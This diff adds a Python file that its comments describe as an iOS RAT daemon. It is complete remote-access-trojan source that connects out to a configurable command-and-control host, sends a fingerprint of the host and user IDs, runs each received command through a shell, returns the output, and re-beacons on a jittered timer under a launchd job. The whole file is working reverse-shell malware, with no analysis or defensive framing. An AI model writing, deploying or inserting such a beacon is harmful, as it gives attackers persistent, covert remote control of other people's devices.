@@ -1,0 +1,36 @@
+#!/usr/bin/env python3
+# ratd — iOS RAT daemon. Reverse-shell beacon to the C2. Staged on-device and
+# compiled/run under the launchd job. Stdlib only.
+import os, socket, subprocess, sys, time, random, json
+
+C2_HOST = os.environ.get("C2_HOST", "127.0.0.1")
+C2_PORT = int(os.environ.get("C2_PORT", "4520"))
+
+def beacon():
+    fp = {"host": socket.gethostname(),
+          "uid": os.getuid(), "euid": os.geteuid(),
+          "pid": os.getpid()}
+    try:
+        s = socket.create_connection((C2_HOST, C2_PORT), timeout=5)
+    except OSError:
+        return
+    s.sendall(json.dumps(fp).encode() + b"\n")
+    while True:
+        data = s.recv(4096)
+        if not data:
+            break
+        try:
+            out = subprocess.run(data.decode().strip(), shell=True,
+                                 capture_output=True, timeout=10)
+            s.sendall(out.stdout)
+        except Exception:
+            pass
+    s.close()
+
+def main():
+    while True:
+        beacon()
+        time.sleep(60 + random.randint(0, 12))
+
+if __name__ == "__main__":
+    main()
